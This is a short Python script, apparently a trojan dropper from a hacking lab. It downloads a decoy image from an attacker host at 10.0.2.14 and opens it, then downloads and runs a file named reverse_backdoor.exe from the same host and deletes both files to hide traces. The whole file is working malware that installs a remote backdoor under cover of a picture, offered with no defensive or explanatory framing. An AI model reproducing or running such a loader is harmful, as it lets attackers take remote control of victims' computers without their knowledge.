#! /usr/bin/env python

import requests
import smtplib
import subprocess
import os
import tempfile


def download_file(url):
    get_response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, "wb") as output_file:
        output_file.write(get_response.content)


temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)

download_file('http://10.0.2.14/evil-file/pic.png')
subprocess.Popen('pic.png', shell=True)

download_file('http://10.0.2.14/evil-file/reverse_backdoor.exe')
subprocess.call('reverse_backdoor.exe', shell=True)

os.remove('pic.png')
os.remove('reverse_backdoor.exe')

